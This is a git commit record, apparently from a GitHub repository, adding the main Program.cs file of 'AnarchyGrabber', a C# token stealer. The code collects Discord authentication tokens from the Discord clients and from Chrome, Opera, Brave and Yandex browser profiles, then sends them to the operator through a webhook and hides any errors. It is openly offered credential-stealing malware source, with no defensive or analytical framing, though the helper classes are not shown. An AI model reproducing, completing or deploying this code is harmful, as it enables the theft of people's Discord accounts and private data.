6661778087e4dbe5465670e111bec8ca65783ce7
Yuh <75444356+yuhsecurity@users.noreply.github.com>
2021-01-18 23:45:30 -0600

    Uploaded ag source

---
+++ AnarchyGrabber/Program.cs
@@ -0,0 +1,36 @@
+﻿using System.Collections.Generic;
+
+namespace AnarchyGrabber
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            List<string> report = new List<string>();
+
+            //attempt to get tokens from the different services (feel free to add more)
+            report.Add("**Discord**");
+            report.AddRange(Grabber.GetTokens(@"Roaming\Discord"));
+            report.Add("\n**Discord Canary**");
+            report.AddRange(Grabber.GetTokens(@"Roaming\discordcanary", true));
+            report.Add("\n**Google Chrome**");
+            report.AddRange(Grabber.GetTokens(@"Local\Google\Chrome\User Data\Default"));
+            report.Add("\n**Opera**");
+            report.AddRange(Grabber.GetTokens(@"Roaming\Opera Software\Opera Stable", true));
+            report.Add("\n**Brave**");
+            report.AddRange(Grabber.GetTokens(@"Local\BraveSoftware\Brave-Browser\User Data\Default", true));
+            report.Add("\n**Yandex**");
+            report.AddRange(Grabber.GetTokens(@"Local\Yandex\YandexBrowser\User Data\Default", true));
+
+            if (Grabber.TokensFound)
+            {
+                //attempts to report the tokens to the user
+                try
+                {
+                    Webhook.ReportTokens(report);
+                }
+                catch { }
+            }
+        }
+    }
+}
